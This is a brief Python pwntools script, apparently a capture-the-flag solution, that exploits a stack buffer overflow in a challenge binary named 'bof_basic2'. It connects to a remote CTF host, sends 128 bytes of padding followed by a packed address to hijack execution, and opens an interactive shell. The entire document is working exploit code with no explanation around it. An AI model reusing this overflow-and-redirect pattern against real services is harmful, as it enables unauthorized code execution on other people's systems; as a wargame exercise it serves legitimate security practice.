from pwn import *

e = ELF("./bof_basic2")
#p = process("./bof_basic")
r = remote("ctf.j0n9hyun.xyz", 3001)
shell = 0x804849b
payload = ''
payload += "A"*80
payload += "B"*48
payload += p32(shell)

r.sendline(payload)
r.interactive()
